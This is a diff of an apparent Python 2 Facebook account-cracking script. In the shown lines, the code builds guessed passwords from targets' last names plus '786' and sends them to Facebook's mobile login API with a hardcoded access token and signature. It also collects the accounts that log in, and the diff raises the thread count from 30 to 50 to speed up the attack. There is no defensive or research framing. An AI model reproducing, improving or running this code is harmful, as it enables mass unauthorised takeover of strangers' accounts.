@@ -376,8 +376,6 @@ def pilih_super():
 						                                        print '\x1b[1;92m[✓] ✯\x1b[1;92m' + b['name']' ✯\x1b[1;92m' + user + '\x1b[1;92m✯\x1b[1;92m' + pass8 + '\n'							
 						                                        oks.append(user+pass8)      				
 					                                        else:
-											a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-											b = json.loads(a.text)
 						                                        pass9 = b['last_name'] + '786'							
 						                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                                        q = json.load(data)								
@@ -392,7 +390,7 @@ def pilih_super():
 		except:
 			pass
 		
-	p = ThreadPool(30)
+	p = ThreadPool(50)
 	p.map(main, id)
 	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 jam.py)↩\033[1;97m....'
